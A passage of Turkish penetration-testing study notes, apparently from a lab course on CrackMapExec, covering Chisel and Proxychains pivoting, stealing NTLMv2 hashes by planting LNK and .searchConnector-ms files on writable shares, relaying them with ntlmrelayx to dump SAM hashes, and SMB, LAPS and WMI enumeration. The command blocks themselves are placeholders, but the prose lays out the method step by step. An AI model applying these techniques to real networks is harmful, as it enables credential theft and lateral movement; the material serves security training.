* Proxyychains'i Chisel varsayÄ±lan portu `TCP 1080`'i kullanacak ÅŸekilde yapÄ±landÄ±rmamÄ±z gerekir. YapÄ±landÄ±rma dosyasÄ±nÄ±n ProxyList bÃ¶lÃ¼mÃ¼ne `socks5 127.0.0.1 1080`'i aÅŸaÄŸÄ±daki gibi eklediÄŸimizden emin olmamÄ±z gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* ArtÄ±k 172.16.1.10 IP'sine ulaÅŸmak iÃ§in `Proxychains` aracÄ±lÄ±ÄŸÄ±yla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains Ã§Ä±ktÄ±sÄ±nÄ± konsoldan kaldÄ±rmak iÃ§in `Proxychains4` ve `quiet -q` seÃ§eneÄŸini kullanabiliriz:

### Quiet SeÃ§eneÄŸi ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracÄ±lÄ±ÄŸÄ±yla herhangi bir CME iÅŸlemi gerÃ§ekleÅŸtirebiliriz.


### Killing Chisel on the Target Machine

Ä°ÅŸimiz bittiÄŸinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak iÃ§in, PowerShell komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in `-X` seÃ§eneÄŸini kullanacaÄŸÄ±z ve PowerShell komutunu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z `Stop-Process - Name chisel -Force .` Komut yÃ¼rÃ¼tme konusunu Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptÄ±ktan sonra, Chisel client komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±z terminal aÅŸaÄŸÄ±daki gibi sonuÃ§lanmalÄ±dÄ±r:


### Chisel'i Zorla Durdurduktan Sonra Terminalin KapanmasÄ±

{{CODE_BLOCK_107}}

ArtÄ±k saldÄ±rÄ± konaÄŸÄ±mÄ±zdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Ãœzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak baÅŸlatarak ve saldÄ±rÄ± hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak baÅŸlatmak iÃ§in `server --socks5` seÃ§eneÄŸini kullanacaÄŸÄ±z.


### Chisel'i Hedef Makinede Sunucu Olarak BaÅŸlatma

{{CODE_BLOCK_109}}

Åimdi hedef makinemiz Chisel sunucusuna baÄŸlanmak ve proxy'yi etkinleÅŸtirmek iÃ§in IP ve porttan sonra `socks` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_110}}

Åimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e BaÄŸlanmak iÃ§in Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bÃ¶lÃ¼mde, **attack host** Ã¼zerinde **Proxychains** ve **Chisel** yapÄ±landÄ±rmayÄ± ve **CrackMapExec** kullanarak hedef makinede **Chisel** Ã§alÄ±ÅŸtÄ±rmayÄ± Ã¶ÄŸrendik.

Ä°lerleyen bÃ¶lÃ¼mlerde, diÄŸer aÄŸlara ulaÅŸmak iÃ§in `CrackMapExec` ve `Proxychains` kullanacaÄŸÄ±z.

---

### Stealing Hashes

Yeni hesaplarÄ± ele geÃ§irmek iÃ§in kullanÄ±lan en yaygÄ±n tekniklerden biri parola hashlerinin Ã§alÄ±nmasÄ±dÄ±r. Bunu baÅŸarmanÄ±n farklÄ± yÃ¶ntemleri vardÄ±r, ancak yaygÄ±n olanÄ±, bir bilgisayarÄ± veya kullanÄ±cÄ±yÄ± kontrol ettiÄŸimiz sahte bir paylaÅŸÄ±lan klasÃ¶rle bir kimlik doÄŸrulama iÅŸlemi baÅŸlatmaya zorlamaktÄ±r.

Bu kimlik doÄŸrulama iÅŸlemini baÅŸlatÄ±rken, kullanÄ±cÄ± veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araÃ§ kullanÄ±larak kÄ±rÄ±labilir veya kimlik bilgilerini bilmeden kullanÄ±cÄ±nÄ±n kimliÄŸine bÃ¼rÃ¼nmek iÃ§in baÅŸka bir bilgisayara iletilebilir.

PaylaÅŸÄ±lan klasÃ¶rleri kullanarak hash'leri Ã§almak iÃ§in bir kÄ±sayol oluÅŸturabilir ve kÄ±sayolda gÃ¶rÃ¼nen simge sahte paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼zÃ¼ gÃ¶sterecek ÅŸekilde yapÄ±landÄ±rabiliriz. KullanÄ±cÄ± paylaÅŸÄ±lan klasÃ¶re girdiÄŸinde, simgenin konumunu aramaya Ã§alÄ±ÅŸacak ve paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼ze karÅŸÄ± kimlik doÄŸrulamasÄ±nÄ± zorlayacaktÄ±r.

NTLMv2 hash'lerini toplama hakkÄ±nda daha fazla bilgi edinmek iÃ§in RedTeam Ekipler iÃ§in [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadÄ±](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kÄ±sayollarÄ±n kullanÄ±mÄ±nÄ± deÄŸil, aynÄ± amaca hizmet eden diÄŸer dosya tÃ¼rlerini de gÃ¶sterir.


### Slinky ModÃ¼lÃ¼

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafÄ±ndan oluÅŸturulan bir modÃ¼ldÃ¼r ve CME'deki en heyecan verici modÃ¼llerden biridir. Prensip basittir. ModÃ¼l, yazma izinlerine sahip tÃ¼m paylaÅŸÄ±mlarda belirtilen SMB sunucusuna bir UNC yolu iÃ§eren simge attribute'a sahip Windows kÄ±sayollarÄ± oluÅŸturur. Birisi paylaÅŸÄ±mÄ± ziyaret ettiÄŸinde, simge attribute'u sunucumuza giden bir UNC yolu iÃ§erdiÄŸi iÃ§in `Responder` kullanarak NTLMv2 hash'ini alacaÄŸÄ±z.

ModÃ¼lÃ¼n `SERVER` ve `NAME` olmak Ã¼zere iki zorunlu seÃ§eneÄŸi ve bir isteÄŸe baÄŸlÄ± `CLEANUP` seÃ§eneÄŸi vardÄ±r.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiÄŸimiz SMB sunucusunun IP'sine ve UNC yolunun iÅŸaret etmesini istediÄŸimiz yere karÅŸÄ±lÄ±k gelir. `NAME` seÃ§eneÄŸi kÄ±sayol dosyasÄ±na bir isim atar, `CLEANUP` ise iÅŸimiz bittiÄŸinde kÄ±sayolu silmek iÃ§indir.


### Chisel kullanarak baÄŸlama

Bu alÄ±ÅŸtÄ±rma iÃ§in lokal eriÅŸimi simÃ¼le edeceÄŸiz ve internal aÄŸa baÄŸlanmak iÃ§in Chisel ve Proxychains kullanacaÄŸÄ±z. Chisel zaten hedef makinemizde bir sunucu olarak Ã§alÄ±ÅŸÄ±yor ve bir client olarak baÄŸlanmamÄ±z ve daha sonra internal aÄŸÄ± numaralandÄ±rmak iÃ§in proxychains kullanmamÄ±z gerekiyor. Chisel kullanarak baÄŸlanmak iÃ§in aÅŸaÄŸÄ±daki komutu **kullanalÄ±m**


### Hedef Makine Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Ã‡alÄ±nmasÄ±
Ä°lk olarak, `--shares` seÃ§eneÄŸini kullanarak `grace` kullanÄ±cÄ±sÄ±nÄ±n `WRITE` ayrÄ±calÄ±klarÄ±na sahip olduÄŸu bir paylaÅŸÄ±m bulalÄ±m:

### WRITE AyrÄ±calÄ±klarÄ±na Sahip PaylaÅŸÄ±mlarÄ± Bulma

{{CODE_BLOCK_114}}


GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `grace` `HR` ve `IT-Tools` paylaÅŸÄ±mlarÄ±na yazabilir. Bu nedenle her bir paylaÅŸÄ±ma bir `LNK` dosyasÄ± yazmak iÃ§in `Slinky` modÃ¼lÃ¼nÃ¼ kullanabiliriz. 

**SERVER=10.10.14.33** seÃ§eneÄŸini kullanarak **attack host**'umuzun **tun0** aÄŸÄ±ndaki **IP adresini** belirteceÄŸiz ve **NAME=important** seÃ§eneÄŸiyle **LNK dosyasÄ±na atanacak dosya adÄ±nÄ±** belirleyeceÄŸiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` aÃ§Ä±sÄ±ndan gÃ¼venli** olarak kabul edilir Ã§Ã¼nkÃ¼ tÃ¼m iÅŸlemler ya **`bellekte` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**, ya **`WinAPI` Ã§aÄŸrÄ±larÄ±yla aÄŸ Ã¼zerinden sorgulanÄ±r**, ya da **Windows'un built-in araÃ§larÄ±/Ã¶zellikleri** kullanÄ±larak gerÃ§ekleÅŸtirilir.

Bu gereksinimleri karÅŸÄ±lamayan bir modÃ¼l Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±mÄ±zda, **Ã¶nceden bir uyarÄ± alÄ±rÄ±z**. **`Slinky`** modÃ¼lÃ¼, **OpSec aÃ§Ä±sÄ±ndan gÃ¼venli olmayan** bir modÃ¼le Ã¶rnektir. Devam etmeden Ã¶nce **bir uyarÄ± alacaÄŸÄ±z**.

LNK dosyasÄ± oluÅŸturulduktan sonra, Responder'Ä± Ã§alÄ±ÅŸtÄ±rmamÄ±z ve birinin paylaÅŸÄ±ma gÃ¶z atmasÄ±nÄ± beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak iÃ§in `Responder.conf` dosyasÄ±nda SMB seÃ§eneÄŸi `On` olmalÄ±dÄ±r.

NTLMv2 hash'imizi aldÄ±k ve hesabÄ± kullanmak iÃ§in onu kÄ±rmamÄ±z gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kÄ±rmak iÃ§in, `ASREPRoast` ve `Kerberoasting` ile yaptÄ±ÄŸÄ±mÄ±z gibi `Hashcat mod 5600`'Ã¼ kullanabiliriz. `NTLM Relay`'e odaklanalÄ±m.


### **NTLM Relay**

DiÄŸer bir Ã§Ã¶zÃ¼m ise NTLMv2 hash'ini doÄŸrudan `SMB Sign`'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± aÄŸdaki diÄŸer sunuculara ve workstation'lara iletmektir. SMB Sign Ã§ok Ã¶nemlidir Ã§Ã¼nkÃ¼ bir bilgisayarda SMB Sign etkinse, saldÄ±rÄ± hostumuzun kimliÄŸini kanÄ±tlayamayacaÄŸÄ±mÄ±z iÃ§in o bilgisayara relay yapamayÄ±z. SMB Sign'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± hedeflerin bir listesini almak iÃ§in `--gen-relay-list` seÃ§eneÄŸini kullanabiliriz.

Åimdi Proxychains'i kullanabilir ve SMB Sign devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracÄ±nÄ±, daha Ã¶nce **`--gen-relay-list`** seÃ§eneÄŸiyle elde ettiÄŸimiz listeyle birlikte kullanacaÄŸÄ±z.

Hedef makinede **local administrator** ayrÄ±calÄ±klarÄ±na sahip bir hesap bulursak ve ek seÃ§enekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanÄ±cÄ±sÄ±nÄ±n hash'leriyle** bir **`pass-the-hash attack`** gerÃ§ekleÅŸtirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanÄ±cÄ±nÄ±n **SMB share**'ine eriÅŸmesini beklemeliyiz. **LNK dosyamÄ±z**, kullanÄ±cÄ±nÄ±n hedef makinemize baÄŸlanmasÄ±nÄ± zorlar (**bu iÅŸlem arka planda gerÃ§ekleÅŸir ve kullanÄ±cÄ± herhangi bir anormallik fark etmez**).

Bu gerÃ§ekleÅŸtiÄŸinde, **`ntlmrelayx`** konsolunda aÅŸaÄŸÄ±dakine benzer bir Ã§Ä±ktÄ± gÃ¶rmeliyiz:

{{CODE_BLOCK_119}}

ArdÄ±ndan, administrator hash'ini kullanarak hedef makinede kimlik doÄŸrulamasÄ± yapmak iÃ§in crackmapexec'i kullanabiliriz:

### Local HesaplarÄ± Test Etme

{{CODE_BLOCK_120}}

### Her Åeyi Temizleyin

ModÃ¼lÃ¼ kullandÄ±ktan sonra, **LNK dosyasÄ±nÄ± temizlemek** iÃ§in **`-o CLEANUP=YES`** seÃ§eneÄŸini ve **LNK dosyasÄ±nÄ±n adÄ±nÄ±** (**`NAME=important`**) belirtmek kritik Ã¶nem taÅŸÄ±r.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc ModÃ¼lÃ¼ ile Hash'lerin Ã‡alÄ±nmasÄ±

Bu bÃ¶lÃ¼mÃ¼ tamamlamadan Ã¶nce, **LNK** dÄ±ÅŸÄ±nda baÅŸka bir dosya formatÄ± kullanarak kimlik doÄŸrulamasÄ±nÄ± zorlamanÄ±n baÅŸka bir yÃ¶ntemine bakalÄ±m: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatlarÄ±. Bu dosya formatlarÄ±nÄ±n Ã§oÄŸu Windows sÃ¼rÃ¼mÃ¼nde **varsayÄ±lan dosya iliÅŸkilendirmeleri** bulunur. Windows ile entegre Ã§alÄ±ÅŸarak iÃ§eriÄŸi rastgele bir konumdan, hatta **`WebDAV` paylaÅŸÄ±mÄ±yla belirtilen remote bir konumdan** gÃ¶sterebilirler.

Ã–zetle, bu dosyalar **LNK** dosyasÄ±yla aynÄ± iÅŸlevi gÃ¶rÃ¼r. Bu yÃ¶ntemin keÅŸfi hakkÄ±nda daha fazla bilgi edinmek iÃ§in **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** baÅŸlÄ±klÄ± blog yazÄ±sÄ±nÄ± okuyabiliriz.

CrackMapExec, **`drop-sc`** adÄ±nda bir modÃ¼le sahiptir. Bu modÃ¼l, paylaÅŸÄ±lan bir klasÃ¶rde **`searchConnector-ms`** dosyasÄ± oluÅŸturmamÄ±za olanak tanÄ±r. Kullanabilmek iÃ§in **URL** seÃ§eneÄŸini belirterek **SMB fake sunucumuzu** hedef gÃ¶stermemiz gerekir. Bu durumda, **`ntlmrelayx`** Ã§alÄ±ÅŸtÄ±ran hostumuz olacaktÄ±r. **URL** deÄŸeri Ã§ift ters eÄŸik Ã§izgi (`\`) ile kaÃ§Ä±rÄ±lmalÄ±dÄ±r. Ã–rneÄŸin: **`URL=\\10.10.14.33\secret`**.

Ä°steÄŸe baÄŸlÄ± olarak aÅŸaÄŸÄ±daki seÃ§enekleri belirleyebiliriz:

* `SHARE=name` seÃ§eneÄŸi ile hedef paylaÅŸÄ±mlÄ± klasÃ¶r . Bu seÃ§eneÄŸi belirtmezsek, dosyayÄ± `WRITE` izinlerine sahip tÃ¼m paylaÅŸÄ±mlara yazacaktÄ±r

* `FILENAME=name` seÃ§eneÄŸi ile dosya adÄ± . Bu seÃ§eneÄŸi belirtmezsek, â€œ`Documents`â€ adÄ±nda bir dosya oluÅŸturacaktÄ±r.

* OluÅŸturduÄŸumuz dosyalarÄ± temizlemek istiyorsak `CLEANUP=True` seÃ§eneÄŸi. EÄŸer Ã¶zel bir isim kullanacaksak filename seÃ§eneÄŸini belirtmemiz gerekiyor.

Drop-sc'yi iÅŸ baÅŸÄ±nda gÃ¶relim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanÄ±cÄ± **paylaÅŸÄ±lan klasÃ¶re** eriÅŸtiÄŸinde ve **ntlmrelayx** dinleme modunda Ã§alÄ±ÅŸÄ±rken, kimlik bilgilerini **hedef makineye yÃ¶nlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak YÃ¶nlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seÃ§eneÄŸi ile `.searchConnector-ms` dosyasÄ±nÄ± temizleyebiliriz:


### searchConnector-ms DosyalarÄ±nÄ± Temizleme

{{CODE_BLOCK_125}}


LNK dosyalarÄ± genellikle bu tÃ¼r saldÄ±rÄ±lar iÃ§in bilinir. `.searchConnector-ms` gibi baÅŸka bir dosya tÃ¼rÃ¼ kullanmak, fark edilmemenize yardÄ±mcÄ± olabilir.

Sonraki bÃ¶lÃ¼mlerde CrackMapExec'in keÅŸif seÃ§eneklerini inceleyeceÄŸiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geÃ§erli bir domain kullanÄ±cÄ± hesabÄ±yla numaralandÄ±rma sÃ¶z konusu olduÄŸunda Ã§ok daha fazla seÃ§enekle birlikte gelir. En Ã§ok kullanÄ±lan seÃ§enekleri ele aldÄ±k, ancak daha derine inelim. Ä°ÅŸte ayrÄ±calÄ±klÄ± olmasa bile geÃ§erli bir hesap aldÄ±ÄŸÄ±mÄ±zda kullanabileceÄŸimiz tÃ¼m seÃ§eneklerin listesi:

| Komut                                                                 | AÃ§Ä±klama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --loggedon-users` | Hedefte oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± listeler.                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --sessions`       | Hedefteki aktif oturumlarÄ± listeler.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --computers`      | Hedef aÄŸdaki bilgisayarlarÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi`            | Belirtilen WMI sorgusunu Ã§alÄ±ÅŸtÄ±rÄ±r.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi-namespace`  | WMI Namespaceâ€™ini belirtir (varsayÄ±lan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --rid-brute`      | Hedef Ã¼zerinde RID brute-force yÃ¶ntemiyle kullanÄ±cÄ±larÄ± listeler. |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --local-groups`   | Local gruplarÄ± listeler; grup belirtilirse Ã¼yelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --shares`         | Hedefteki tÃ¼m paylaÅŸÄ±m izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`          | Hedefteki domain kullanÄ±cÄ±larÄ±nÄ± listeler.                        |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`         | Hedefteki domain gruplarÄ±nÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --pass-pol`       | Domainin password policy'sini gÃ¶sterir.                           |

Daha Ã¶nce Ã§alÄ±ÅŸmamÄ±ÅŸ olanlarÄ± gÃ¶zden geÃ§irelim:

### Hedefteki aktif oturumlarÄ± / oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± numaralandÄ±rma

Birden fazla hedefi ele geÃ§irmiÅŸsek, aktif oturumlarÄ± kontrol etmek faydalÄ± olabilir, belki bir domain administrator vardÄ±r ve bu belirli hedefe odaklanmamÄ±z gerekebilir. Bir bilgisayardaki kullanÄ±cÄ±larÄ± tespit etmek iÃ§in `--sessions` ve `--loggedon-users` seÃ§eneklerini kullanabiliriz. Session'lar, kullanÄ±cÄ±nÄ±n hedef makinede giriÅŸ yapmÄ±yor olsa da kullanÄ±cÄ± kimlik bilgileriyle oturum aÃ§Ä±ldÄ±ÄŸÄ± anlamÄ±na gelir. GiriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±lar ise kendiliÄŸinden anlaÅŸÄ±lÄ±r; bir kullanÄ±cÄ±nÄ±n hedef makineye giriÅŸ yapmÄ±ÅŸ olduÄŸunu ifade eder. `BloodHound`, aktif oturumlarÄ± bulmak iÃ§in kullanabileceÄŸimiz bir diÄŸer araÃ§tÄ±r.


### Sessions ve loggendon-users seÃ§eneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanÄ±cÄ±yÄ± arÄ±yorsak, -`-loggedon-users-filter` seÃ§eneÄŸini ve ardÄ±ndan aradÄ±ÄŸÄ±mÄ±z kullanÄ±cÄ±nÄ±n adÄ±nÄ± kullanabiliriz. Birden fazla kullanÄ±cÄ± arÄ±yorsak, `regex`'i de destekler.


### Oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larla filtre seÃ§eneÄŸini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin baÅŸarÄ±lÄ± bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±labilmesi iÃ§in administrator izinleri gereklidir.



### Enumerate Computers

CME ayrÄ±ca domain bilgisayarlarÄ±nÄ± da listeleyebilir ve bunu bir LDAP isteÄŸi gerÃ§ekleÅŸtirerek yapar

### Domain'deki BilgisayarlarÄ± NumaralandÄ±rma

{{CODE_BLOCK_128}}


Not: Bu seÃ§enek yalnÄ±zca SMB protokolÃ¼nde mevcut olsa da, CME bir LDAP sorgusu yapmaktadÄ±r.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e baÄŸlÄ± bilgisayarlarÄ±n local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca uygun kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya sÄ±fÄ±rlama talebinde bulunabilir. LAPS domain iÃ§inde kullanÄ±lÄ±yorsa ve LAPS ÅŸifrelerini okuyabilen bir hesabÄ± tehlikeye atarsak, `--laps` seÃ§eneÄŸini bir hedef listesi ile kullanabilir ve komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir veya `--sam` gibi diÄŸer seÃ§enekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: EÄŸer varsayÄ±lan administrator hesap adÄ± "`administrator`" deÄŸilse, -`-laps username` seÃ§eneÄŸinden sonra kullanÄ±cÄ± adÄ±nÄ± ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak KullanÄ±cÄ±larÄ± NumaralandÄ±r --rid-brute

Nadiren kullanÄ±lan bir Ã¶zellik, kullanÄ±cÄ± listeleri oluÅŸturmak iÃ§in `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanÄ±cÄ± listesi oluÅŸturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktÄ±r. CrackMapExec'in `--rid-brute` seÃ§eneÄŸini kullanarak, UserID'sini brute forcing yaparak bir kullanÄ±cÄ± listesi toplamak mÃ¼mkÃ¼ndÃ¼r.


### List Local Users

{{CODE_BLOCK_130}}

VarsayÄ±lan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandÄ±rÄ±r. DavranÄ±ÅŸÄ±nÄ± `--rid-brute [MAX_RID]` kullanarak deÄŸiÅŸtirebiliriz.

`--rid-brute` seÃ§eneÄŸi, brute ile zorlanan kimliklerle eÅŸleÅŸen kullanÄ±cÄ± adlarÄ±nÄ± ve diÄŸer Active Directory objeleri almak iÃ§in kullanÄ±labilir. `NULL Authentication` etkinleÅŸtirilmiÅŸse domain hesaplarÄ±nÄ± numaralandÄ±rmak iÃ§in de kullanÄ±labilir. Bu seÃ§eneÄŸin bu ÅŸekillerde kullanÄ±labileceÄŸini unutmamak Ã¶nemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatÄ±rlamamÄ±z gereken Ã¶nemli bir parÃ§a, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi saÄŸlayan bir `--disks` seÃ§eneÄŸine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain GruplarÄ±nÄ± NumaralandÄ±rma

Local-groups ile local gruplarÄ± veya `--groups` ile domain gruplarÄ±nÄ± listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


EÄŸer grup Ã¼yelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: YazÄ±m sÄ±rasÄ±nda `--local-group` yalnÄ±zca bir Domain Controller'a karÅŸÄ± Ã§alÄ±ÅŸÄ±r ve grup adÄ±nÄ± kullanarak bir grubu sorgulamak iÅŸe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows iÅŸletim sistemlerinde administrative iÅŸlemler iÃ§in kullanÄ±lÄ±r. Remote bilgisayarlardaki administrative gÃ¶revlerini otomatikleÅŸtirmek iÃ§in WMI script dosyalarÄ± veya uygulamalarÄ± yazabiliriz. WMI, iÅŸletim sisteminin diÄŸer bÃ¶lÃ¼mlerine ve System Center Operations Manager (eski adÄ±yla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi Ã¼rÃ¼nlere yÃ¶netim verileri saÄŸlar.

Windows Management Instrumentation'nÄ±n (WMI) birincil kullanÄ±m alanlarÄ±ndan biri, sÄ±nÄ±f (class) ve Ã¶rnek (instance) bilgileri iÃ§in WMI havuzunu sorgulama yeteneÄŸidir. Ã–rneÄŸin, WMI'dan remote veya local bir sistemden shut-down olaylarÄ±nÄ± temsil eden tÃ¼m objeleri dÃ¶ndÃ¼rmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanÄ±r: `49152-65535 (RPC dinamik portlarÄ± - Windows Vista, 2008 ve Ã¼zeri)`, TCP 1024-65535 (RPC dinamik portlarÄ± - Windows NT4, Windows 2000, Windows 2003) veya WMI'yÄ± Ã¶zel bir port aralÄ±ÄŸÄ± kullanacak ÅŸekilde ayarlayabiliriz

Ã–rneÄŸin, remote bir bilgisayarda `Sysmon` uygulamasÄ±nÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± sorgulamak ve `Caption` ve `ProcessId`'yi gÃ¶rÃ¼ntÃ¼lemek iÃ§in WMI kullanalÄ±m, kullanacaÄŸÄ±mÄ±z WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` ÅŸeklindedir:


### Sysmon'un Ã‡alÄ±ÅŸÄ±p Ã‡alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± Sorgulamak iÃ§in WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sÄ±nÄ±flarÄ±nÄ± hiyerarÅŸik bir namespace iÃ§inde dÃ¼zenler. Bir sorgu gerÃ§ekleÅŸtirmek iÃ§in, Class Name ve bulunduÄŸu Namespace'i bilmemiz gerekir. YukarÄ±daki Ã¶rnekte, `Win32_Process` sÄ±nÄ±fÄ±nÄ± `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik Ã§Ã¼nkÃ¼ varsayÄ±lan olarak CME, `root\cimv2`'yi kullanÄ±r (bu bilgiyi --help menÃ¼sÃ¼nde gÃ¶rebiliriz).

BaÅŸka bir namespace'i sorgulamak iÃ§in onu belirtmemiz gerekir. Ã–rneÄŸin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sÄ±nÄ±fÄ±nÄ± sorgulayalÄ±m. Bu sÄ±nÄ±f, sistem Ã§alÄ±ÅŸÄ±rken dinamik olarak aÃ§Ä±lÄ±p kapanmasÄ± gereken cihazlar hakkÄ±nda bilgi tutar. Belirli bir konuyla ilgili WMI sÄ±nÄ±flarÄ±nÄ±n nasÄ±l bulunacaÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yÄ± sorgulamak iÃ§in administrative ayrÄ±calÄ±klarÄ±na sahip olmamÄ±z gerekir, ancak bir administrator, WMI'yÄ± sorgulamak iÃ§in administrator olmayan bir hesabÄ± yapÄ±landÄ±rabilir. Bu durumda, WMI sorgularÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



